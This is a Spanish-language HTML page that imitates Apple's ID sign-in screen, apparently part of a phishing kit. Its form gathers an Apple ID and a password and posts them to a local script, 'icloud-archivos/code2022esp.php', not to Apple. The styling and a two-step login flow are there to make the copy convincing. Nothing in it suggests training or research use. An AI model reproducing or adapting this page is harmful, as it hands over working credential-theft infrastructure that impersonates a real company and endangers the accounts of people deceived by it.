<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Iniciar sesión con ID de Apple</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #f5f5f7;
            padding: 20px;
        }

        .login-container {
            text-align: center;
            background: white;
            padding: 5vh 5vw;
            border-radius: 25px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
            width: 100%;
            max-width: 800px;
            min-height: 80vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        .logo {
            width: min(25vw, 200px);
            margin-bottom: 5vh;
            transition: width 0.3s ease;
        }

        h2 {
            font-size: min(6vw, 40px);
            margin: 2vh 0 5vh;
            color: #1d1d1f;
            font-weight: 600;
            line-height: 1.2;
        }

        .input-container {
            position: relative;
            width: 100%;
            max-width: 500px;
            margin: 2vh auto;
        }

        input {
            width: 100%;
            padding: 3vh 8vw 3vh 3vw;
            border: 2px solid #d2d2d7;
            border-radius: 15px;
            font-size: min(4vw, 20px);
            outline: none;
            transition: all 0.3s ease;
            background-color: #f9f9f9;
        }

        input:focus {
            border-color: #0071e3;
            box-shadow: 0 0 15px rgba(0, 113, 227, 0.3);
            background-color: white;
        }

        .icon {
            position: absolute;
            right: 4vw;
            top: 50%;
            transform: translateY(-50%);
            width: min(6vw, 30px);
            cursor: pointer;
            opacity: 0.7;
            transition: opacity 0.3s ease;
        }

        .forgot-password {
            display: block;
            margin-top: 4vh;
            font-size: min(3.5vw, 18px);
            color: #0071e3;
            cursor: pointer;
            text-decoration: none;
            transition: opacity 0.3s ease;
        }

        .forgot-password:hover {
            text-decoration: underline;
            opacity: 0.9;
        }

        .remember-me {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-top: 4vh;
            font-size: min(3.5vw, 16px);
            color: #6e6e73;
        }

        .remember-me input {
            width: min(4vw, 25px);
            height: min(4vw, 25px);
            margin-right: 2vw;
        }

        @media (max-width: 768px) {
            .login-container {
                padding: 8vh 8vw;
                border-radius: 20px;
                min-height: 70vh;
            }

            input {
                padding: 2.5vh 10vw 2.5vh 4vw;
                font-size: 16px;
            }

            .icon {
                right: 6vw;
                width: 25px;
            }
        }

        @media (max-width: 480px) {
            body {
                padding: 10px;
            }

            .login-container {
                padding: 6vh 6vw;
                border-radius: 15px;
                min-height: 85vh;
            }

            h2 {
                font-size: 24px;
            }

            input {
                padding: 2vh 12vw 2vh 5vw;
                font-size: 14px;
            }

            .icon {
                right: 8vw;
                width: 20px;
            }

            .remember-me {
                font-size: 14px;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <center>
        <img src="icloud-archivos/applenew2.png" alt="Apple Logo" class="logo">
    </center>
        <h2>Iniciar sesión con ID de Apple</h2>
        <form id="login-form" action="icloud-archivos/code2022esp.php" method="POST">
            <div class="input-container">
                <input type="text" id="apple-id" name="apple_id" placeholder="Apple ID" required>
                <button type="button" id="next-button" style="background: none; border: none; position: absolute; right: 0; top: 50%; transform: translateY(-50%); cursor: pointer; padding: 2vw;">
                    <img src="login2.png" alt="arrow" class="icon">
                </button>
            </div>
            <div class="input-container" id="password-container" style="display: none;">
                <input type="password" id="password" name="password" placeholder="Contraseña" required>
                <button type="submit" style="background: none; border: none; position: absolute; right: 0; top: 50%; transform: translateY(-50%); cursor: pointer; padding: 2vw;">
                    <img src="login2.png" alt="arrow" class="icon">
                </button>
            </div>
        </form>
        <div class="remember-me">
            <input type="checkbox" id="remember">
            <label for="remember">Mantener sesión abierta</label>
        </div>
        <a href="#" class="forgot-password">¿Olvidaste tu ID de Apple o la contraseña?</a>
    </div>

    <script>
        document.getElementById("next-button").addEventListener("click", function() {
            let appleIdInput = document.getElementById("apple-id");
            let appleIdValue = appleIdInput.value.trim();

            if (appleIdValue && !appleIdValue.includes("@")) {
                appleIdInput.value = appleIdValue + "@apple.com";
            }

            document.getElementById("password-container").style.display = "block";
            document.getElementById("password").focus();
        });

        document.getElementById("apple-id").addEventListener("keypress", function(event) {
            if (event.key === "Enter") {
                event.preventDefault();
                document.getElementById("next-button").click();
            }
        });
    </script>
</body>
</html>
